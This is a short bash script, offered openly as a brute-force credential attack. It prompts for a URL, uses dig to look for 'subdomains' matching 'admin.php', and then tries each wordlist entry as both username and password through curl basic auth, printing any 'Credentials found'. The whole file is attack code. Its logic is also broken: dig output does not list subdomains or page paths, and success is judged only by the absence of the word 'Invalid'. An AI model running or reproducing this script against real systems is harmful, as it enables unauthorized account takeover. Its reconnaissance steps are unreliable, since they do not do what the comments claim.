#!/bin/bash

# Prompt the user for a URL
read -p "Enter a URL: " url

# Use the `dig` command to find subdomains
subdomains=$(dig $url +short | grep -v $url | grep "admin.php")

# Print the subdomains
echo "Subdomains containing 'admin.php':"
echo $subdomains

# Loop through the subdomains
for sub in $subdomains; do
  # Read the wordlist file
  while read line; do
    # Perform the brute force attack
    curl --user "$line:$line" --silent $sub | grep -q "Invalid"
    if [ $? -ne 0 ]; then
      echo "Credentials found: $line:$line"
      break
    fi
  done < wordlist.txt
done
